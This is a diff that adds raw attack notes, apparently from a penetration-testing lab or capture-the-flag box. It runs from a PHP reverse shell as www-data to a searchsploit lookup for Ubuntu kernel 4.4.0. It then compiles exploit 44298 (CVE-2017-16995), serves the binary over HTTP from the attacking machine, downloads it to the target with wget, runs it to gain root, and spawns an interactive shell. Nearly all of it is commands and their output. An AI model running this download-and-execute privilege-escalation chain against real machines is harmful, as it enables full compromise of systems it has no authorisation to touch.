@@ -198,3 +198,82 @@ Interesting Finding(s):
 [+] Data Received: 87.458 KB
 [+] Memory used: 198.133 MB
 [+] Elapsed time: 00:00:04
+
+
+/usr/share/webshells/php/php-reverse-shell.php
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ uname -a
+Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+
+on the host 
+ed@1nk:~$ searchsploit ubuntu | grep 4.4.0
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalati | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                                           | linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                            | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege E | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privile | windows_x86-64/local/47170.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                         | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalat | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR  | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privileg | linux/local/47169.c
+
+
+└─$ searchsploit -m 44298.c
+
+  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/44298
+     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
+    Codes: CVE-2017-16995
+ Verified: False
+File Type: C source, ASCII text
+Copied to: /home/kali/44298.c
+
+┌──(kali㉿kali)-[~/44298]
+└─$ gcc 44298.c -o 1.out --static
+
+┌──(kali㉿kali)-[~/44298]
+└─$ sudo python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+172.16.33.51 - - [19/Apr/2024 00:02:16] "GET /1.out HTTP/1.1" 200 -
+
+
+$ wget http://10.8.0.234:8080/1.out -o /tmp/1.out       
+$ cd /tmp
+$ ls
+1.out
+1.out.1
+a.out
+n.out
+systemd-private-6cd3bbe424ac41eead6d07720344490f-systemd-timesyncd.service-9wnNxa
+
+
+$chmod +x 1.out
+$ ls -la
+total 1552
+drwxrwxrwt  8 root     root       4096 Nov 16 05:31 .
+drwxr-xr-x 22 root     root       4096 Mar 17  2017 ..
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .ICE-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .Test-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .X11-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .XIM-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .font-unix
+-rwxrwxrwx  1 www-data www-data 776448 Apr 18  2024 1.out
+-rw-rw-rw-  1 www-data www-data 776448 Apr 18  2024 1.out.1
+
+$ ./1.out
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+whoami
+root
+python3 -c "import pty; pty.spawn('/bin/bash')"
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+
+
